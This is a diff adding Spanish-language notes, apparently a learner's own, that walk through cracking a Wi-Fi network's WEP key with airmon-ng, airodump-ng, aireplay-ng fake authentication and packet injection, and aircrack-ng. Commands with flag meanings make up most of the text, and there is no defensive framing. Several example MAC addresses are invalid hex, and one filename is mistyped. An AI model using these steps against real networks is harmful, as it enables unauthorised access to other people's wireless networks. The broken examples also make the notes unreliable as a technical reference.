@@ -1,0 +1,38 @@
+airmon-ng
+     viene de aircrack monitos: sirve para colocar la tarjeta de red en modo monitor, el modo monitor sirve para hacer ataques pasivos asi (captura de paquetes) que se encuentran el el aire, tambien nos permite inyectar paquetes (data injection)
+airmon-ng start <nombre de la interfaz de red>
+     habilita todo lo que te dije para la red que especificas
+----- airmon-ng start <nombre>
+ese es el comando
+**
+airodump-ng <nombre que bota el anterior comando> 
+*
+sirve para captuar IV's  (creo que son como paquetitos no estoy seguro), con ese comando compruebas que si es posible capturar los IV's
+** airodump-ng -c <numerp canal> -w bell --bssid <direccion MAC> <nombre que bota el comando airmon>
+** ejemplo
+airodump-ng -c 4 -w bell 76:FR:42:f4:23 wlan0mon
+**
+sirve para lo que te dije anterioirmente pero ahora especificas con que interfaz de red vas a vulnerar
+significados:
+-c 4: especifica el numero de canal
+-w bell: crea un archivo con nombre bell donde se guardan los IV's
+--bssid aa:bb:cc:dd:ee: es la direccion MAX del punto de acceso (AP)
+** aireplay-ng -1 0 -a <MAC> <nombre interfaz>
+**
+ejemplo:
+aireplay-ng -1 0 -a FR:43:F5:4f:G6 wlan0mon
+sirve para hacer una falsa autenticacion con el punto de acceso (AP) , de esta manera cualquier paquete sera aceptado por el AP , aqui se prepata la inyeccion de datos
+significado:
+-1 : es para falsa autenticacion
+0: tiempo de reasociacion
+-a aa:bb:cc:ee:dd: punto de acceso MAC
+** aireplay-ng -3 -b <MAC> <nombre>
+**
+ejemplo:
+aireplay-ng -3 -b AR:5F:6G:FF wlan0mon
+sirve para capturar paquetes e inyectarlos en la red, aqui se reenvian paquetes y generan nuevos IV's ..osea un mayr flujo de datos... lo propicio es que se cuente con 100 paquetes/segundo
+finalmente
+aircrack-ng <nombre usado con -w>-01.cap
+ejemplo:
+aircrack-ng bell-01,cap
+sirve para obteer la clave WEP apartir de los IV's
